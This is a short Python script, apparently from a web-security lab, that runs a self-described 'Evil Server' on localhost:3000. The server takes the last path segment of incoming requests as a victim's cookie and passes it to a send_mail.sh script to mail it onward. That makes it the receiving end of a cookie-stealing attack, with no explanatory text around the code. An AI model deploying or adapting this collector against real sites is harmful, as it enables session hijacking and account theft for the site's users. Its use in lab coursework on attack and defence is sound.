#!/usr/bin/env python3

import os
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

send_mail = "/home/kali/CLionProjects/Zookws/send_mail.sh"
last_cookie = None


class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global last_cookie
        path = urlparse(self.path).path
        cookie = os.path.basename(path).replace('cookie/', '')
        if not cookie or cookie == 'favicon.ico' or cookie == last_cookie:
            return
        else:
            last_cookie = cookie
        try:
            output = subprocess.check_output(['sh', send_mail, cookie])
            print(f'Output: {output}')
            # self.send_response(200)

            self.send_response(200)
            self.end_headers()
        except subprocess.CalledProcessError as e:
            print(f'Error: {e}')


def main():
    host = 'localhost'
    port = 3000
    server = HTTPServer((host, port), RequestHandler)
    print(f'Evil Server listening on {host}:{port}')
    server.serve_forever()


if __name__ == '__main__':
    main()
